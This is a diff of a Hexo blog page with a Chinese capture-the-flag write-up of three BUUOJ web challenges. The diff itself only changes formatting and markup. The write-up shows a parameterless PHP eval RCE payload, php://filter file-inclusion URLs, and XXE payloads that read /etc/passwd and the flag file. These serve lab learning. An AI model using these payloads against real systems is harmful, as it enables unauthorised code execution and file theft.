@@ -78,7 +78,8 @@
     
   </style>
   
-<meta name="generator" content="Hexo 6.3.0"></head>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Err0r233" type="application/atom+xml">
+</head>
 
 
 
@@ -177,7 +178,7 @@
                     <i class="fa fa-edit"></i> 
                     
                     
-                        ~7.39K
+                        ~7.35K
                     
                     字
                 </li>
@@ -202,73 +203,57 @@
             <hr />
             <div itemprop="articleBody"><p>做做buuoj上的web题，本萌新纯采集，轻喷（（（</p>
 <span id="more"></span>
-
-<h2><span id="gxyctf-2019-禁止套娃">[GXYCTF 2019] 禁止套娃</span></h2><p>打开靶机，页面直接显示 “flag在哪里呢？”</p>
+<h2><span id="gxyctf-2019-禁止套娃"> [GXYCTF 2019] 禁止套娃</span></h2>
+<p>打开靶机，页面直接显示 “flag在哪里呢？”</p>
 <p>所以我们使用dirsearch扫描试试，看看是否有敏感文件</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://7aba8553-300c-45a5-<span class="number">8127</span>-dbfdd5038404.node4.buuoj.cn:<span class="number">81</span>/ --timeout=<span class="number">2</span></span><br></pre></td></tr></table></figure>
-
 <p>不得不说buu的反爬是真的恶心…扫快一点就会弹429</p>
 <img src="/2022/12/15/Buuoj%E9%A2%98%E7%9B%AE-2/2.png" class title="扫出git">
-
-<p>发现&#x2F;.git&#x2F;能正常访问</p>
+<p>发现/.git/能正常访问</p>
 <p>使用githack下载源码，源码如下：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>一眼顶针，鉴定为无参数RCE（经典括号嵌套）</p>
 <p>这个过滤的挺少，直接祭出payload薄纱：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure>
-
 <img src="/2022/12/15/Buuoj%E9%A2%98%E7%9B%AE-2/3.png" class title="获取flag">
-
 <p>（雾）</p>
 <hr>
 <p>好了不闹了，先用：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())));</span><br></pre></td></tr></table></figure>
-
 <p>看flag的位置：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">5</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;.&quot;</span> [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;..&quot;</span> [<span class="number">2</span>]=&gt; <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;.git&quot;</span> [<span class="number">3</span>]=&gt; <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;flag.php&quot;</span> [<span class="number">4</span>]=&gt; <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;index.php&quot;</span> &#125;</span><br></pre></td></tr></table></figure>
-
 <p>发现在倒数第二，使用array_reverse逆转到第二位，刚好能够使用next函数读取数组的第二位</p>
 <p>使用show_source读取php文件即可</p>
-<h2><span id="bsidescf-2020-had-a-bad-day">[BSidesCF 2020] Had a bad day</span></h2><p>打开靶机，发现很多猫图和狗子的图片（雾，重点不是这个）</p>
-<p>看看上面的url，发现category&#x3D;</p>
+<h2><span id="bsidescf-2020-had-a-bad-day"> [BSidesCF 2020] Had a bad day</span></h2>
+<p>打开靶机，发现很多猫图和狗子的图片（雾，重点不是这个）</p>
+<p>看看上面的url，发现category=</p>
 <p>这引诱人上去加单引号啊（（（</p>
 <p>试试加个单引号</p>
 <p>发现报错了，但是报错的不是sql（</p>
 <img src="/2022/12/15/Buuoj%E9%A2%98%E7%9B%AE-2/4.png" class title="报错">
-
 <p>发现了include报错，尝试能不能打开index.php获取源码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category=php:<span class="comment">//filter/convert.base64-encode/resource=index</span></span><br></pre></td></tr></table></figure>
-
 <p>成功读取base64，进行一个解码：</p>
 <img src="/2022/12/15/Buuoj%E9%A2%98%E7%9B%AE-2/5.png" class title="获取源码">
-
 <p>以下是解码的内容：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;description&quot; content=&quot;Images that spark joy&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, minimum-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Had a bad day?&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;css/material.min.css&quot;&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;page-layout mdl-layout mdl-layout--fixed-header mdl-js-layout mdl-color--grey-100&quot;&gt;</span><br><span class="line">      &lt;header class=&quot;page-header mdl-layout__header mdl-layout__header--scroll mdl-color--grey-100 mdl-color-text--grey-800&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;mdl-layout__header-row&quot;&gt;</span><br><span class="line">          &lt;span class=&quot;mdl-layout-title&quot;&gt;Had a bad day?&lt;/span&gt;</span><br><span class="line">          &lt;div class=&quot;mdl-layout-spacer&quot;&gt;&lt;/div&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">      &lt;/header&gt;</span><br><span class="line">      &lt;div class=&quot;page-ribbon&quot;&gt;&lt;/div&gt;</span><br><span class="line">      &lt;main class=&quot;page-main mdl-layout__content&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;page-container mdl-grid&quot;&gt;</span><br><span class="line">          &lt;div class=&quot;mdl-cell mdl-cell--2-col mdl-cell--hide-tablet mdl-cell--hide-phone&quot;&gt;&lt;/div&gt;</span><br><span class="line">          &lt;div class=&quot;page-content mdl-color--white mdl-shadow--4dp content mdl-color-text--grey-800 mdl-cell mdl-cell--8-col&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;page-crumbs mdl-color-text--grey-500&quot;&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;h3&gt;Cheer up!&lt;/h3&gt;</span><br><span class="line">              &lt;p&gt;</span><br><span class="line">                Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option and let the adorable images cheer you up!</span><br><span class="line">              &lt;/p&gt;</span><br><span class="line">              &lt;div class=&quot;page-include&quot;&gt;</span><br><span class="line">              &lt;?php</span><br><span class="line">				$file = $_GET[&#x27;category&#x27;];</span><br><span class="line"></span><br><span class="line">				if(isset($file))//重点在这，如果category传参的内容没有woofers/meowers/index的话，不会include文件</span><br><span class="line">				&#123;</span><br><span class="line">					if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;</span><br><span class="line">						include ($file . &#x27;.php&#x27;);</span><br><span class="line">					&#125;</span><br><span class="line">					else&#123;</span><br><span class="line">						echo &quot;Sorry, we currently only support woofers and meowers.&quot;;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				?&gt;</span><br><span class="line">			&lt;/div&gt;</span><br><span class="line">          &lt;form action=&quot;index.php&quot; method=&quot;get&quot; id=&quot;choice&quot;&gt;</span><br><span class="line">              &lt;center&gt;&lt;button onclick=&quot;document.getElementById(&#x27;choice&#x27;).submit();&quot; name=&quot;category&quot; value=&quot;woofers&quot; class=&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded=&quot;,MaterialButton,MaterialRipple&quot;&gt;Woofers&lt;span class=&quot;mdl-button__ripple-container&quot;&gt;&lt;span class=&quot;mdl-ripple is-animating&quot; style=&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/button&gt;</span><br><span class="line">              &lt;button onclick=&quot;document.getElementById(&#x27;choice&#x27;).submit();&quot; name=&quot;category&quot; value=&quot;meowers&quot; class=&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded=&quot;,MaterialButton,MaterialRipple&quot;&gt;Meowers&lt;span class=&quot;mdl-button__ripple-container&quot;&gt;&lt;span class=&quot;mdl-ripple is-animating&quot; style=&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/button&gt;&lt;/center&gt;</span><br><span class="line">          &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">          &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/main&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;script src=&quot;js/material.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>重点就是传参的内容需要含有woofers或者meowers或者index，才能进行文件的包含，那这个就很简单了，直接加一个woofers&#x2F;meowers&#x2F;index到base64-encode后面去即可，payload如下：</p>
+<p>重点就是传参的内容需要含有woofers或者meowers或者index，才能进行文件的包含，那这个就很简单了，直接加一个woofers/meowers/index到base64-encode后面去即可，payload如下：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//a10a5c5c-7c62-4cda-ad8d-b07dac49ea46.node4.buuoj.cn:81/index.php?category=php://filter/convert.base64-encode/meowers/resource=flag</span></span><br><span class="line">或者:</span><br><span class="line">http:<span class="comment">//a10a5c5c-7c62-4cda-ad8d-b07dac49ea46.node4.buuoj.cn:81/index.php?category=php://filter/convert.base64-encode/index/resource=flag</span></span><br><span class="line">或者：</span><br><span class="line">http:<span class="comment">//a10a5c5c-7c62-4cda-ad8d-b07dac49ea46.node4.buuoj.cn:81/index.php?category=php://filter/convert.base64-encode/woofers/resource=flag</span></span><br></pre></td></tr></table></figure>
-
 <p>获得base64，解码获得flag：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Can you read this flag? --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="comment">// flag&#123;f770d839-9c2a-47eb-9998-25958d168322&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h2><span id="nctf-2019-fake-xml-cookbook">[NCTF 2019] Fake XML cookbook</span></h2><p>又是我不会的新知识呢</p>
+<h2><span id="nctf-2019-fake-xml-cookbook"> [NCTF 2019] Fake XML cookbook</span></h2>
+<p>又是我不会的新知识呢</p>
 <p>XXE（XML External Entity Injection）</p>
 <p>打开靶机，又是登录。。。</p>
 <p>尝试弱口令和SQL注入，肯定是不行的</p>
 <p>然后使用Burp抓包，发现了一段：</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p>加载了来自外部的实体，导致了可以加载外部文件，可以进行文件的读取</p>
 <p>以及加上题目的提示 XML，应该可以执行XXE</p>
 <p>一个经典的XXE组成如下（DTD外部实体声明）</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span>		#xml声明</span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span>											#DTD部分</span><br><span class="line">&lt;123&gt;<span class="symbol">&amp;asdf;</span>&lt;/123&gt;							#xml部分</span><br></pre></td></tr></table></figure>
-
 <p>所以直接通过burp抓包，然后使用XXE攻击即可</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">admin</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p>成功获得flag</p>
 <img src="/2022/12/15/Buuoj%E9%A2%98%E7%9B%AE-2/1.png" class title="获取flag">
 </div>
@@ -467,7 +452,7 @@
     <div class="photo-background"></div>
     <div class="photo-wrapper clearfix">
         <div class="photo-wrapper-tip text-center">
-            <img class="about-photo" src="/images/luo.webp" loading="lazy" decoding="auto" />
+            <img class="about-photo" src="/images/Oscar.jpg" loading="lazy" decoding="auto" />
         </div>
     </div>
     <div class="textwidget">
